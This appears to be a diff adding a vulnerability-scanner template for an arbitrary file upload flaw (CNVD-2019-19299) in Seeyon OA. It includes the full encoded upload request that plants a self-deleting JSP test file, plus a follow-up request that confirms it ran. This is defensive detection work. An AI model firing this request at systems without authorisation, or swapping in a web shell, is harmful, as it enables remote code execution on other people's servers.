@@ -1,0 +1,70 @@
+id: seeyon-oa-file-upload-cnvd-2019-19299
+info:
+  name: Seeyon OA File Upload Vulnerability (CNVD-2019-19299)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Seeyon OA file upload vulnerability allows unauthorized users to upload and execute arbitrary files.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2019-19299
+    - https://www.cnvd.org.cn/patchInfo/show/166115
+
+http:
+  - id: r0
+    method: GET
+    path:
+      - '{{BaseURL}}/seeyon/htmlofficeservlet'
+    matchers:
+      - type: regex
+        regex:
+          - "DBSTEP.*?operate err"
+
+  - id: r1
+    method: POST
+    path:
+      - '{{BaseURL}}/seeyon/htmlofficeservlet'
+    headers:
+      Content-Type: text/html
+    body: |
+      DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
+      OPTION=S3WYOSWLBSGr
+      currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+      CREATEDATE=wUghPB3szB3Xwg66
+      RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+      originalFileId=wV66
+      originalCreateDate=wUghPB3szB3Xwg66
+      FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdwLoGzYOfyUCAwUNCwYMCyUoEwighP4oXy4OJwLQCzAw5nHzs
+      needReadFile=yRWZdAS6
+      originalCreateDate=wLSGP4oEzLKAz4=iz=66
+      <%@ page contentType="text/html;charset=UTF-8" language="java" %>
+      <%@ page import="java.security.MessageDigest" %>
+      <%@ page import="com.sun.org.apache.xerces.internal.impl.dv.util.HexBin" %>
+      <%
+          MessageDigest mdAlgorithm = MessageDigest.getInstance("md5");
+          mdAlgorithm.reset();
+          mdAlgorithm.update("just_a_test".getBytes());
+          byte[] digest = mdAlgorithm.digest();
+          out.println(HexBin.encode(digest).toLowerCase());
+          new java.io.File(application.getRealPath(request.getServletPath())).delete();
+      %>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "DBSTEP"
+      - type: word
+        words:
+          - "just_a_test"
+
+  - id: r2
+    method: GET
+    path:
+      - '{{BaseURL}}/seeyon/1255dbf9627d1bdf27301822d4a19d7c.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "c6db3524fe71d6c576098805a07e79e4"
